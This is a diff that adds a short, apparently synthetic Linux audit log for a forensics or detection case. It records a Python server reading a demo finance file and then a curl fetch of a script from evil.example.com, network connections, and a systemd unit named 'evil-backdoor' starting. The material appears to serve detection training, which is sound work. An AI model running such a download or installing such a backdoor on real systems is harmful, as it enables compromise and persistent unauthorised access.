@@ -1,0 +1,17 @@
+----
+type=PROCTITLE msg=audit(2026年09月08日 10:06:41.516:530) : proctitle=python3 core_server.py
+type=PATH msg=audit(2026年09月08日 10:06:41.516:530) : item=0 name=data/finance_demo.txt inode=264115 dev=08:02 mode=file,664 ouid=mxy ogid=mxy nametype=NORMAL
+type=CWD msg=audit(2026年09月08日 10:06:41.516:530) : cwd=/home/mxy/case01-core
+type=SYSCALL msg=audit(2026年09月08日 10:06:41.516:530) : arch=x86_64 syscall=openat success=yes exit=5 a0=AT_FDCWD a1=0x78c395b97c10 a2=O_RDONLY|O_CLOEXEC a3=0x0 items=1 ppid=4766 pid=4773 auid=mxy uid=mxy gid=mxy tty=pts1 ses=2 comm=python3 exe=/usr/bin/python3.12 subj=unconfined key=case01_demo_file
+----
+type=EXECVE msg=audit(2026年09月08日 10:07:00.100:531) : argc=2 a0=curl a1=http://evil.example.com/x.sh
+type=SYSCALL msg=audit(2026年09月08日 10:07:00.100:531) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x1 a1=0x2 items=2 ppid=100 pid=101 auid=mxy uid=1000 gid=1000 tty=pts0 ses=2 comm=curl exe=/usr/bin/curl subj=unconfined key=case01_process_exec
+----
+type=SOCKADDR msg=audit(2026年09月08日 10:07:01.200:532) : saddr=02000050C0A801660000000000000000
+type=SYSCALL msg=audit(2026年09月08日 10:07:01.200:532) : arch=x86_64 syscall=connect success=yes exit=0 a0=0x5 a1=0x7ffe a2=0x10 items=0 ppid=100 pid=101 auid=mxy uid=1000 gid=1000 tty=pts0 ses=2 comm=curl exe=/usr/bin/curl subj=unconfined key=case01_network
+----
+type=SOCKADDR msg=audit(2026年09月08日 10:07:02.300:533) : saddr=01002F72756E2F757365722F313030302F6275730000
+type=SYSCALL msg=audit(2026年09月08日 10:07:02.300:533) : arch=x86_64 syscall=connect success=yes exit=0 a0=0x6 a1=0x7ffb items=0 ppid=100 pid=101 auid=mxy uid=1000 gid=1000 tty=pts0 ses=2 comm=curl exe=/usr/bin/curl subj=unconfined key=case01_network
+----
+type=SERVICE_START msg=audit(2026年09月08日 10:07:30.400:534) : pid=1 uid=0 auid=unset ses=unset msg='unit=evil-backdoor comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success' UID="root" AUID="unset"
+----
